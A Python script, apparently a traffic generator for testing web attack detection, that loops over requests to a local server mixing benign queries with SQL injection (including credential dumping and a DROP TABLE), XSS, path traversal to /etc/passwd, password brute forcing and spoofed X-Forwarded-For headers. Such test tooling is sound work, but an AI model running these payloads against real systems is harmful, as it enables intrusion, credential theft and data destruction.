import requests
import time
import random
import urllib.parse

BASE = "http://127.0.0.1:8080"

# -----------------------------------------------------------
# USER AGENTS + IP SPOOFING
# -----------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/8.1.0",
    "sqlmap/1.7.0#stable",
    "python-requests/2.32",
    "Nmap Scripting Engine",
    "Mozilla/5.0 (compatible; bingbot/2.0)",
    "Mozilla/5.0 (compatible; AhrefsBot/6.1)"
]

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def make_request(method, path, params=None, data=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": random_ip()
    }
    url = BASE + path
    try:
        if method == "GET":
            requests.get(url, params=params, headers=headers, timeout=3)
        else:
            requests.post(url, data=data, headers=headers, timeout=3)
    except:
        pass


# -----------------------------------------------------------
# NORMAL TRAFFIC
# -----------------------------------------------------------
NORMAL_QUERIES = [
    "hello", "kali", "user123", "search something",
    "weather today", "how to cook rice", "flask tutorial",
]

def normal_traffic():
    q = random.choice(NORMAL_QUERIES)
    make_request("GET", "/search", params={"q": q})


# -----------------------------------------------------------
# SQL INJECTION
# -----------------------------------------------------------
SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT username, password FROM users --",
    "'; DROP TABLE users; --",
    "admin' --",
    "' OR SLEEP(3) --",
]

def sql_traffic():
    payload = random.choice(SQLI_PAYLOADS)
    encoded = urllib.parse.quote(payload)
    make_request("GET", "/login.php", params={"user": encoded})


# -----------------------------------------------------------
# XSS
# -----------------------------------------------------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

def xss_traffic():
    payload = random.choice(XSS_PAYLOADS)
    encoded = urllib.parse.quote(payload)
    make_request("GET", "/search", params={"q": encoded})


# -----------------------------------------------------------
# LOCAL FILE INCLUSION / PATH TRAVERSAL
# -----------------------------------------------------------
LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../windows/win.ini",
    "../app.py",
    "php://filter/convert.base64-encode/resource=index.php",
]

def lfi_traffic():
    p = random.choice(LFI_PAYLOADS)
    make_request("GET", f"/{p}")


# -----------------------------------------------------------
# BRUTE FORCE
# -----------------------------------------------------------
USERS = ["admin", "root", "alice", "bob"]
PASSWORDS = ["1234", "admin", "password", "letmein", "qwerty"]

def brute_force():
    user = random.choice(USERS)
    pwd = random.choice(PASSWORDS)
    make_request("POST", "/login.php", data={"username": user, "password": pwd})


# -----------------------------------------------------------
# RANDOM ATTACK DECISION
# -----------------------------------------------------------
def random_attack():
    choice = random.choice(["normal", "sql", "xss", "brute", "lfi"])

    if choice == "normal":
        normal_traffic()
    elif choice == "sql":
        sql_traffic()
    elif choice == "xss":
        xss_traffic()
    elif choice == "brute":
        brute_force()
    elif choice == "lfi":
        lfi_traffic()


# -----------------------------------------------------------
# MAIN LOOP
# -----------------------------------------------------------
if __name__ == "__main__":
    print("🔥 Realistic Traffic Attack Script Running...")

    while True:
        random_attack()
        time.sleep(random.uniform(0.2, 0.6))
                 
